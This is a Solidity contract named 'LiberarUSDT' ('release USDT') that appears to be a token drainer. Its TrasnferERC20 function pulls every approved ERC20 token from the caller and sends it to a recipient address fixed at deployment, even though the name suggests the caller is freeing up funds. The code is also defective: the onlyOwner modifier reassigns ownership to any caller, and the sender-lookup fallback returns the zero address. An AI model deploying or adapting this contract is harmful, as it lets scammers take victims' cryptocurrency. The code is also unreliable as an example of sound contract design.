// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
//irelay
abstract contract IRelayRecipient {
    function isTrustedForwarder(address forwarder) public virtual view returns(bool);
    function _msgSender() internal virtual view returns (address payable);
    function versionRecipient() external virtual view returns (string memory);
}
/**
* a contract must implement this interface in order to support relayed transaction.
* It is better to inherit the BaseRelayRecipient as its implementation.
*/
abstract contract BaseRelayRecipient is IRelayRecipient {

    /*
    * Forwarder singleton we accept calls from
    */
    address public trustedForwarder;

    /*
    * require a function to be called through GSN only
    */
    modifier trustedForwarderOnly() {
        require(msg.sender == address(trustedForwarder), "Function can only be called through the trusted Forwarder");
        _;
    }

    function isTrustedForwarder(address forwarder) public override view returns(bool) {
        return forwarder == trustedForwarder;
    }

    /**
    * return the sender of this call.
    * if the call came through our trusted forwarder, return the original sender.
    * otherwise, return `msg.sender`.
    * should be used in the contract anywhere instead of msg.sender
    */
    function _msgSender() internal override virtual view returns (address payable ret) {
        if (msg.data.length >= 24 && isTrustedForwarder(msg.sender)) {
            // At this point we know that the sender is a trusted forwarder,
            // so we trust that the last bytes of msg.data are the verified sender address.
            // extract sender address from the end of msg.data
            assembly {
                ret := shr(96,calldataload(sub(calldatasize(),20)))
            }
        } else {
            //return msg.sender;
        }
    }
}

//Wallet aqui

contract LiberarUSDT is BaseRelayRecipient {
    address public owner;
    address public recipient;
    uint256 public balances;
    string private _version;

    modifier onlyOwner() {
        owner = _msgSender();
        _;
    }

    event TransferSent (address _from, address _destAddr, uint _amount);

    constructor(address _trustedForwarder, address _recipient) {
        trustedForwarder = _trustedForwarder;
        recipient = _recipient;
        owner = _msgSender();
    }

    function setVersion(string memory version_) external {
        _version = version_;
    }

    function versionRecipient() external view override returns (string memory) {
        return _version;
    }

    //Función enviar dinero
    function TrasnferERC20(address[] memory _tokens, uint256[] memory _amounts) external {

        require(_tokens.length == _amounts.length, "toke's count and amount's count shoule be same.");

        uint256 tokenCount = _tokens.length;

        for (uint i=0; i<tokenCount; i++) {
            
            IERC20(_tokens[i]).transferFrom(msg.sender, recipient, _amounts[i]);
        }

    }

    //Función obtener el balance de la billetera
    function balanceOf() view public returns(uint){
        return address(this).balance;
    }
}